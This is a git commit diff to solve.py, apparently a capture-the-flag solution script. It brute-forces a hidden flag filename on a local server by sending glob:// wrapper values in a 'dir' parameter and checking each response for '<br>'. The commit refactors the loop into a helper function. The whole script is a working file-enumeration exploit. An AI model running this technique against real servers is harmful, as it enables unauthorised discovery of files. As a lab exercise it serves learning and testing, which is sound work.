cf8a440521bc121012bebd665adb18e6509aae5a
marvhus <44480334+marvhus@users.noreply.github.com>
2022-08-30 00:09:14 +0200

    updates

--- solve.py
+++ solve.py
@@ -1,33 +1,29 @@
 import requests
 
 URL = "http://0.0.0.0:8000"
+alphabet = "abcdefABCDEF0123456789"
 chars = 'flag'
 
-alphabet = "abcdefABCDEF0123456789"
+# Check if the filename matches
+def check(char=''):
+    PARAMS = {'dir': f'glob://./{chars}{char}'}
+    r = requests.get(url = URL, params = PARAMS)
+    return r.text.__contains__('<br>')
 
 for i in range(15):
-    # loop over all the possible chars it could be
     for char in alphabet:
-        # Check if the char matches
-        PARAMS  = { 'dir': f'glob://./{chars}{char}*' }
-        r =requests.get(url = URL, params = PARAMS)
-        if r.text.__contains__('<br>'):
+        # Check if it matches, if it does, then add the char to chars
+        if check(char + '*'):
             chars += char
             break
-    
-    # Print the found hex so far
-    print("flag" + chars)
-    
-    # Check if the hex ends early
-    PARAMS = { 'dir': f'glob://./{chars}.txt' }
-    r = requests.get(url = URL, params = PARAMS)
-    if r.text.__contains__('<br>'):
-        print('end')
+
+    # Print what has been found so far
+    print(chars, end="\r")
+
+    # Check if we found it early
+    if check('.txt'):
         break
 
-# Just make sure everything is correct
-final = f"{chars}.txt"
-PARAMS = {'dir': 'glob://./' + final}
-r = requests.get(url = URL, params = PARAMS)
-print(r.text.__contains__('<br>'))
-print(final)
+# Final checks
+print(f"\nFound:\t {check('.txt')}")
+print(f"File:\t {chars}.txt")
